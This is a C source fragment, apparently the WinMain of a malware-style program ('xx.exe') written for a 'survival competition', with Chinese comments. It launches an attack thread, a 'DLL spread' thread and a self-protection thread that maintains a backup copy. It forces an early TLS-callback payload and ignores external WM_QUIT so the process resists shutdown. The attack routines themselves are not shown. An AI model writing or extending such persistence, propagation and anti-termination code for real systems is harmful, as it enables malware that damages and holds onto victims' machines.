/* ================== 主入口 ================== */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);

    /* 触发一次真实 TLS 访问：MinGW ld 只有看到存活的 TLS 引用才会
       生成 TLS Directory，否则 .CRT$XLB 里的 EarlyPayload 永不触发。 */
#if defined(__GNUC__)
    (void)g_tlsTicket;
#endif

    InitializeCriticalSection(&g_csLog);

    /* Step 1: start attack immediately */
    HANDLE hAttackThread = CreateThread(NULL, 0, AttackThread, NULL, 0, NULL);
    if (hAttackThread) {
        CloseHandle(hAttackThread);
        WriteLog(L"Attack thread started first");
    }

    /* Step 2: background init + DLL spread */
    HANDLE hInitThread = CreateThread(NULL, 0, InitThread, NULL, 0, NULL);
    if (hInitThread) {
        CloseHandle(hInitThread);
        WriteLog(L"Init thread started");
    }

    /* Step 3: self-protection (maintain xx.exe backup) */
    HANDLE hSelfThread = CreateThread(NULL, 0, SelfProtectThread, NULL, 0, NULL);
    if (hSelfThread) {
        CloseHandle(hSelfThread);
        WriteLog(L"Self-protect thread started");
    }

    WriteLog(L"Entering message loop");

    /* message loop + periodic alive log */
    DWORD dwLastTick = GetTickCount();
    MSG msg;

    while (1) {
        // 处理消息
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            /* 外部 PostThreadMessage(WM_QUIT) 会让 PeekMessage 直接返回 WM_QUIT，
               一条消息就能让 xx 退出并触发复活/共享内存连锁，故直接吞掉
               （与 window.dll 消息循环同一策略）。 */
            if (msg.message == WM_QUIT) {
                WriteLog(L"ignored external WM_QUIT");
                continue;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }


        // 定期写入存活日志
        if (GetTickCount() - dwLastTick > 5000) {
            WriteLog(L"XX alive, PID: %lu", GetCurrentProcessId());
            dwLastTick = GetTickCount();
        }
        Sleep(1000);
    }

    /* 循环不会自行退出：xx.exe 只能被外部结束（这是存活竞赛的要求）。
       以下收尾代码保留，仅在被编译器优化掉的极端路径下才可能到达。 */
    DeleteCriticalSection(&g_csLog);
    if (g_pSharedView) UnmapViewOfFile(g_pSharedView);
    if (g_hSharedMem) CloseHandle(g_hSharedMem);
    if (g_hHeartbeatEvent) CloseHandle(g_hHeartbeatEvent);
    return 0;
}
